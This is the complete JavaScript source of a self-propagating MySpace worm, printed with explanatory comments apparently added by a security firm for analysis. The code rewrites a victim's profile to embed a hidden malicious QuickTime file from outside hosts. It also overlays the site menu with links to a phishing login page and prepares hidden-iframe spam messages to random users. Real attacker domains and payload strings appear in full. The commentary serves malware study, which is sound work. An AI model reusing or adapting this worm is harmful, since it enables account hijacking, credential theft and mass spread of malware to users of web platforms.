/*
 * Source code received from BurntPickle (http://www.myspace.com/burntpickle)
 * 
 * Comments and formating by SPI Dynamics (http://www.spidynamics.com)
 * This code may be republished as long as the above text is kept
 */

//========================================================
//======================================================== Functions
//========================================================

//It is odd that the author uses both literal JavaScript functions and
//anonymous functions

/*
 doEdit - Edits someone's profile to infect them with the Quicktime file
          and the HTML to overwrite the top menu with a phishing menu
params:
    oXML - An XHConn object that has received a response
returns: void
          
*/
var doEdit=function(oXML){
    //extract the friend id from the current page
	var friendid=encodeURIComponent(findContents(oXML,'friendid=','&MyToken=',9));

	if(friendid){
	    //extract the old values for the various profile fields
		var theviewstate = encodeURIComponent(findContents(oXML,'__VIEWSTATE','\" />', 37));
		var thehash = encodeURIComponent(findContents(oXML,'editInterests_hash','\" />', 27));
		var headlinetext = encodeURIComponent(findContents(oXML,'editInterests$HeadlineText','\" maxlength', 47));
		var aboutmetext = encodeURIComponent(findContents(oXML,'editInterests$AboutMeText','</textarea>', 127));
		var liketomeettext = encodeURIComponent(findContents(oXML,'editInterests$LikeToMeetText','</textarea>', 133));
		var generaltext = encodeURIComponent(findContents(oXML,'editInterests$GeneralText','</textarea>', 126));
		var musictext = encodeURIComponent(findContents(oXML,'editInterests$MusicText','</textarea>', 122));
		var moviestext = encodeURIComponent(findContents(oXML,'editInterests$MoviesText','</textarea>', 124));
		var televisiontext = encodeURIComponent(findContents(oXML,'editInterests$TelevisionText','</textarea>', 132));
		var bookstext = encodeURIComponent(findContents(oXML,'editInterests$BooksText','</textarea>', 122));
		var heroestext = encodeURIComponent(findContents(oXML,'editInterests$HeroesText','</textarea>', 124));
		if('%22%20maxleng' == headlinetext) {
			headlinetext  = '';
		}

        //Checking if this profile already has a reference to the quicktime movie, and thus if has this profile
        //already been infected. This is used later
		var c = moviestext.indexOf("piAF2iuswo.mov");
        
		var urlpost = 'http://' + document.location.host + '/Modules/ProfileEdit/Pages/Interests.aspx?fuseaction=profile.interests';

        //Update the profile with our infected content
        //Note that all the controls start with the same prefix. The author could have
        //stored this prefix in a string to make the virus smaller.
		var postinfo = "__VIEWSTATE=" + theviewstate
		+ "&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24hash=" + thehash
		+ "&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24SaveTop=Save+All+Changes"
		+ "&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24HeadlineText=" + headlinetext
		//Here the HTML for the top menu with Phishing links is inserted into the profile
		+ "&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24AboutMeText=" + aboutmetext + cc[0]
		+ "&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24LikeToMeetText=" + liketomeettext
		+ "&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24GeneralText=" + generaltext
		+ "&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24MusicText=" + musictext
		//Here a reference to the quicktime movie is inserted
		+ "&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24MoviesText=" + moviestext + cc[3]
		+ "&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24TelevisionText=" + televisiontext
		+ "&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24BooksText=" + bookstext
		+ "&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24HeroesText=" + heroestext;

        //The author is checking if this profile has already been infected. Really, this check should have been
        //perform at the start of function. This would have made the virus faster by not having to perform
        //needless string operations.
		if(-1 == c) {
		    //if profile has not been infected, update the profile with infected content.
			editProf.connect(urlpost,"POST",postinfo,friendsWrapper);
		}
	}
};

/*
 doMessage - Tries to send a message to another MySpace user
             with a link to a pornographic website
params: none
returns: void
          
*/
function domessage() {
    //for all the iframes that were created to send a message
    for(var y=0;y<ap.length;y++) {
	    if(-1!=window.frames['qtkt'+y].document.body.innerHTML.indexOf('ctl00$ctl00$Main$Main$sendMessageControl$subjectTextBox')) {
	        //populate the subject with a random message
		    window.frames['qtkt'+y].document.forms[1].ctl00$ctl00$Main$Main$sendMessageControl$subjectTextBox.value=su[Math.floor(6*(Math.random()%1))];
			//insert a pornographic picture which links to a pornographic website
			window.frames['qtkt'+y].document.forms[1].ctl00$ctl00$Main$Main$sendMessageControl$bodyTextBox.value=cc[2];

			//The below line of code would send the message to a MySpace user.
			//in the copy of the code I received, this line was commented out
			//because of this, it appear the worm didn't actually send the messages

			//window.frames['qtkt'+y].document.forms[1].btnSend.click();
        }
    }
}

/*
findContents - Extracts a substring that occurs between two other strings
params:
    oXML - An XHConn object which has returned a response
    start - first string to look for
    end - string to find that occurs after the start string
    offset - offset between the two string to begin extracting at

returns: Extracted contents or an empty string
          
*/
var findContents=function(oXML,start,end,offset){
	var s,e,n;
	s=oXML.responseText.indexOf(start)
	//only keep looking if we found the start string
	if(-1!=s) {
		e=oXML.responseText.indexOf(end,s);
		n=oXML.responseText.substring(s+offset,e);
        //this undoes an HTML entity conversion, because the text was reflected inside a Textbox and
        //had entities applied to it when returned from MySpace
		return n.replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&quot;/g,"\"").replace(/&amp;/g,"&");
	}
	return '';
};

/*
friendsWrapper - Unknown. The source code I received simply had an empty function
                 with a comment. This might just exist because a callback function
                 is needed for the XmlHttpRequest that is made to update the profile
          
*/
var friendsWrapper=function(oXML){
	// removed for now
}

/*
XHConn - Creates a new XHConn object, which extends the XmlHttpRequest object. It
         handles creating an XHR in a cross platform manner, and creates a wrapper
         that handles onreadystatechange.

returns: XHConn object
          
*/
function XHConn() {
    //this may be a mistake, because these variables
    //are declared as global variables instead of properties
    //of the XHConn object
	var xmlhttp, bComplete = false;

    //Create XHR, regardless of browser
	try { xmlhttp = new ActiveXObject("Msxml2.XMLHTTP"); }
	catch(e) {
		try { xmlhttp = new ActiveXObject("Microsoft.XMLHTTP"); }
		catch(e) {
			try { xmlhttp = new XMLHttpRequest(); }
			catch(e) { xmlhttp = false; }
		}
	}
	if(!xmlhttp) return null;
	
	/*adds a connect method
	
	  params:
	    sURL - URL to send request to
	    sMethod - HTTP method to use, if not GET, assumes POST
	    sVars - PARAMETERS
	    fnDone - function to callback once connection is completed
	*/
	this.connect = function(sURL, sMethod, sVars, fnDone) {
		if(!xmlhttp) return false;
		bComplete = false;
		sMethod = sMethod.toUpperCase();
		try {
		    //if it is a get, we send no parameters
			if(sMethod == "GET") {
				xmlhttp.open(sMethod, sURL, true)
				sVars = "";
			} else {
			    //else sent the appropriate headers for a POST
				xmlhttp.open(sMethod, sURL, true);
				xmlhttp.setRequestHeader("Method","POST "+sURL+" HTTP/1.1");
				xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			}
			//Wrap the onreadystatechange and make sure that that the request has completly returned
			xmlhttp.onreadystatechange = function() {
			    //normally a check for statuscode == 200 is done here, but for some reason they didn't
				if(xmlhttp.readyState == 4 && !bComplete) {
					bComplete = true;
					fnDone(xmlhttp);
				}
			};
			//send the request
			xmlhttp.send(sVars);
		} catch(z) { return false; }
		return true;
	};
	return this;
}

//========================================================
//======================================================== Global Variables
//========================================================

//the content the worm needed (Phishing pages, malicious Quicktime movie, JavaScript code, etc)
//was stored on multiple servers. The worm randomly selects one to use
var ll=new Array();
ll[0]='http://www.daviddraftsystem.com/images/';
ll[1]='http://www.tm-group.co.uk/images/';
var lll=ll[Math.floor(2*(Math.random()%1))];

//this is an array containing different phrases to use as the subject of a message to other MySpace
//users
var su=new Array();
su[0]='what else is there to do on a Sunday.?.......';
su[1]='You better not forget about this..';
su[2]='Hehe that was so funny..';
su[3]='better see this one last time lol..';
su[4]='omg did you see this last nite..';
su[5]='whos coming to the party tonight.?..';

//This array contains various payloads used by the worm
var cc=new Array();
//This is the HTML used to hide the old top menu bar and replace it with a menu pointing to a fake login page
cc[0]='<style type="text/css">\n'
+'div table td font { display: none }\n'
+'div div table tr td a.navbar, div div table tr td font { display: none }\n'
+'.testnav { position:absolute; top: 136px; left:50%; _top: 146px }\n'
+'</style><div style="z-index:5; background-color: #6698CB; margin-left:-400px; width: 800px" align="center" class="testnav"><div style="">'
+'<a href="'+lll+'login.html" target="" class="navbar">Home</a> | <a href="'+lll+'login.html" target="" class="navbar">Browse</a> | '
+'<a href="'+lll+'login.html" target="" class="navbar">Search</a> | <a href="'+lll+'login.html" target="" class="navbar">Invite</a> | '
+'<a href="'+lll+'login.html" target="" class="navbar">Film</a> | <a href="'+lll+'login.html" target="" class="navbar">Mail</a> | '
+'<a href="'+lll+'login.html" target="" class="navbar">Blog</a> | <a href="'+lll+'login.html" target="" class="navbar">Favorites</a> | '
+'<a href="'+lll+'login.html" target="" class="navbar">Forum</a> | <a href="'+lll+'login.html" target="" class="navbar">Groups</a> | '
+'<a href="'+lll+'login.html" target="" class="navbar">Events</a> | <a href="'+lll+'login.html" target="" class="navbar">Videos</a> | '
+'<a href="'+lll+'login.html" target="" class="navbar">Music</a> | <a href="'+lll+'login.html" target="" class="navbar">Comedy</a> | '
+'<a href="'+lll+'login.html" target="" class="navbar">Classifieds</a></div></div>'; //profile
//This is the body of the message sent to other MySpace users. It contains a pornographic picture and a link to a pornographic website
cc[2]='<a href="http://google.com/url?q=http://www.vidchicks.com/home.php"><img border="0" src="http://img453.imageshack.us/img453/5603/youtubedt7rf2.jpg">'; //mesages
//This is HTML added to a profile with a link to the malicious Quicktime movie. It uses styles to try and hide itself from the user
cc[3]='<div style="width: 1px; height: 1px; overflow: hidden; text-indent: -9999px"><embed src='+lll+'piAF2iuswo.mov /></div>'; // profile inf


//========================================================
//======================================================== Code Execution Starts Here
//========================================================

//Please note that all variables declared here are global variables, as
//JavaScript does not have block level variable scope. This allows functions
//like doMessages() to access variables created here.

// Malware will execute only if variable editProf is not defined.
// Once the worm runs it defines this variable. This serves as a kill switch
// by preventing the virus from running multiple times on the same page
if((typeof editProf == "undefined") && (top == self)) {
	var ap=new Array(4);
	var fi=new Array(4);
    //This code picks 4 MySpace users at random and sets up code to
    //send them a message
	for(var x=0;x<ap.length;x++) {
	    //randomly generate a friend ID
		var ran_unrounded=80000000+(105000000-80000000)*Math.random();
		var ran_number=Math.floor(ran_unrounded);
		fi[x]=ran_number;
        //build a hidden iFrame. This will be used to send a message to a MySpace user
		ap[x]=document.createElement('iframe');
		ap[x].height=1;
		ap[x].width=1;
		ap[x].name="qtkt"+x;
		ap[x].id="qtkt"+x;
		document.getElementsByTagName('body')[0].appendChild(ap[x]);
		ap[x].src='http://profile.myspace.com/index.cfm?fuseaction=mail.message&friendID='+fi[x];
	}
    //In 6 seconds, execute the domessage() function. this will (try) to send messages to the randomly
    //selected people.	
	setTimeout("domessage()",6000);
    //create a new instance of XHconn. This also prevents the worm from running again on the same page
	var editProf = new XHConn();
    //Go fetch a the edit page for the user's profile and call the doEdit() function when you receive a response
	editProf.connect('http://'+document.location.host+'/Modules/ProfileEdit/Pages/Interests.aspx',"GET","",doEdit);
}